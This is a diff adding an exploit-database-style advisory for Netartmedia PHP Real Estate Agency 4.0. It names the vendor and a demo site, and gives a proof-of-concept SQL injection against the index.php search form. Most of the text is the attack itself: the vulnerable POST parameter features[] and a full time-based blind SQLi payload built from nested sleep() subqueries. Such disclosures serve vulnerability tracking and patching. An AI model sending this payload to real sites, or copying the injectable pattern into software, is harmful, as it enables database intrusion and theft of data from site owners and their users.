@@ -1,0 +1,17 @@
+# Exploit Title: Netartmedia PHP Real Estate Agency 4.0 - SQL Injection
+# Date: 19.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.netartmedia.net/propertyagency/
+# Demo Site: https://www.phpscriptdemos.com/agency/
+# Version: 4.0
+# Tested on: Kali Linux
+# CVE: N/A
+# Description:PHP Real Estate Agency is a web software written in PHP
+especially designed for real estate agencies to help create quickly
+and launch their own websites with their listings and information on
+it.
+----- PoC SQLi -----
+
+Request: http://localhost/[PATH]/index.php
+Parameter: features[] (POST)
+Payload: ad_type=&bathrooms=&bedrooms=&features[]=(select(0)from(select(sleep(0)))v)/*'%2B(select(0)from(select(sleep(0)))v)%2B'"%2B(select(0)from(select(sleep(0)))v)%2B"*/&field_location=1&listing_type=&location=&mod=search&only_pictures=1&order_by=date&pfield51_0=1&pfield51_1=1&pfield51_2=1&price_from=1&price_to=1&search_keyword=&search_type=search_form&size_from=1&size_to=1&type=1&zip=94102&zip_distance=94102&zip_radius=1&zip_type=1
